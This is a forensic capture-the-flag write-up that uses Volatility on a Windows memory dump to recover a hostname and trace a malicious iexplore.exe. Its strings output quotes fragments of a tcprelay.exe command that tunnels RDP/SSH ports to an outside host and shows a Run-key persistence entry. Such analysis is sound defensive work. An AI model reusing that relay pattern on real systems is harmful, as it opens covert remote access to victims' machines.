# Command & Control - level 2
**Category:** Forensic **Points:** 15 **Description:**
**Statement**
> Berthier, with your help the computer have been identified. You have requested a memory dump and before starting your analysis you want to take a look at the antivirus logs. Unfortunately you forget to write down the workstation hostname. But it’s not a problem to get it back since you have a memory dump.
The validation flag is the workstation hostname

# Write-up


Get the list of suggested profiles with imageinfo

> volatility -f ch2.dmp imageinfo



>          Suggested Profile(s): Win7SP1x86_23418, Win7SP0x86, Win7SP1x86
>                    AS Layer1 : IA32PagedMemoryPae (Kernel AS)
>                    AS Layer2 : FileAddressSpace (C:\Users\danie\Downloads\ch2.dmp)
>                     PAE type : PAE
>                          DTB : 0x185000L
>                         KDBG : 0x82929be8L
>         Number of Processors : 1
>    Image Type (Service Pack) : 0
>               KPCR for CPU 0 : 0x8292ac00L
>            KUSER_SHARED_DATA : 0xffdf0000L
>          Image date and time : 2013-01-12 16:59:18 UTC+0000
>    Image local date and time : 2013-01-12 17:59:18 +0100



Get the list of hives, more specifically to get the virtual offset of the SYSTEM hive.
>volatility -f ch2.dmp hivelist --profile=Win7SP1x86


>Virtual    Physical   Name
>---------- ---------- ----
>0x8ee66740 0x141c0740 \SystemRoot\System32\Config\SOFTWARE
>0x90cab9d0 0x172ab9d0 \SystemRoot\System32\Config\DEFAULT
>0x9670e9d0 0x1ae709d0 \??\C:\Users\John Doe\ntuser.dat
>0x9670f9d0 0x04a719d0 \??\C:\Users\John Doe\AppData\Local\Microsoft\Windows\UsrClass.dat
>0x9aad6148 0x131af148 \SystemRoot\System32\Config\SAM
>0x9ab25008 0x14a61008 \SystemRoot\System32\Config\SECURITY
>0x9aba79d0 0x11a259d0 \??\C:\Windows\ServiceProfiles\LocalService\NTUSER.DAT
>0x9abb1720 0x0a7d4720 \??\C:\Windows\ServiceProfiles\NetworkService\NTUSER.DAT
>0x8b20c008 0x039e1008 [no name]
>0x8b21c008 0x039ef008 \REGISTRY\MACHINE\SYSTEM
>0x8b23c008 0x02ccf008 \REGISTRY\MACHINE\HARDWARE
>0x8ee66008 0x141c0008 \Device\HarddiskVolume1\Boot\BCD


Now that we know the virtual offset for the SYSTEM hive, get the computer name with the key "ControlSet001\Control\ComputerName\ComputerName" with printkey

> volatility -f ch2.dmp printkey -o 0x8b21c008 -K "ControlSet001\Control\ComputerName\ComputerName" --profile=Win7SP1x86



> Legend:(S) = Stable (V) = Volatile
> Registry: \REGISTRY\MACHINE\SYSTEM
> Key name: ComputerName (S)
> Last updated: 2013-01-12 00:58:30 UTC+0000
> Subkeys:
> Values:
> REG_SZ                        : (S) mnmsrvc 
> REG_SZ        ComputerName    : (S) WIN-ETSA91RKCFP


# Command & Control - level 3
**Category:** Forensic **Points:** 30 **Description:**
**Statement**
Berthier, the antivirus software didn’t find anything. It’s up to you now. Try to find the malware in the memory dump. The validation flag is the md5 checksum of the full path of the executable.

I start by checking the process tree with

> vol.py -f ch2.dmp --profile=Win7SP1x86 pstree
> iexplore.exe has a cmd.exe child process and that's suspicious.
> . 0x87b6b030:iexplore.exe                            2772   2548      2     74 2013-01-12 16:40:34 UTC+0000
> .. 0x89898030:cmd.exe                                1616   2772      2    101 2013-01-12 16:55:49 UTC+0000


I dump those 2 processes:

> vol.py -f ch2.dmp --profile=Win7SP1x86 procdump -p 2772 -D /home/AlanSmithee/Chall/RootMe/Forensic/
> vol.py -f ch2.dmp --profile=Win7SP1x86 procdump -p 1616 -D /home/AlanSmithee/Chall/RootMe/Forensic/

Then I have a look at strings of the two processes.
There are strings which look suspicious.
> rabin2 -z /home/AlanSmithee/Chall/RootMe/Forensic/executable.2772.exe
> addr=0x00402004 off=0x00000e04 ordinal=000 sz=9 section=.data string=DEADBABE


Especially for cmd.exe:

> rabin2 -z /home/AlanSmithee/Chall/RootMe/Forensic/executable.1616.exe
> addr=0x4a36461e off=0x0003341e ordinal=118 sz=26 section=.data string=P23, Are you sure (Y/N)? 
> addr=0x4a364667 off=0x00033467 ordinal=119 sz=47 section=.data string=O~1\AppData\Local\Temp\TEMP23\tcprelay.exe",2 
> addr=0x4a3646a8 off=0x000334a8 ordinal=120 sz=14 section=.data string=r batch file.
> addr=0x4a36860b off=0x0003740b ordinal=121 sz=9 section=.data string=s TEMP23
> addr=0x4a368633 off=0x00037433 ordinal=122 sz=31 section=.data string=22 3389 yourcsecret.co.tv 443 
> addr=0x4a368675 off=0x00037475 ordinal=123 sz=35 section=.data string=Local\Temp\TEMP23\tcprelay.exe",2 
> addr=0x4a36c611 off=0x0003b411 ordinal=124 sz=15 section=.data string=mdir /s TEMP23
> addr=0x4a36c647 off=0x0003b447 ordinal=125 sz=37 section=.data string=168.0.22 3389 yourcsecret.co.tv 443 
> addr=0x4a36c692 off=0x0003b492 ordinal=126 sz=36 section=.data string=p\TEMP23\tcprelay.exe",2 >> get.vbs


I check persistence using

> vol.py -f ch2.dmp --profile=Win7SP1x86 autoruns


We can see that process 2772 has a persistence mechanism.

> Autoruns =========================================
> Hive: \??\C:\Users\John Doe\ntuser.dat
>    Software\Microsoft\Windows\CurrentVersion\Run (Last modified: 2013-01-12 14:13:19 UTC+0000)
        IEPreload                      : "C:\Users\John Doe\AppData\Roaming\Microsoft\Internet Explorer\Quick >Launch\iexplore.exe" (PIDs: 2772)
        RESTART_STICKY_NOTES           : C:\Windows\System32\StikyNot.exe (PIDs: 2744)
        
        
And now we also have the path of the malware.      
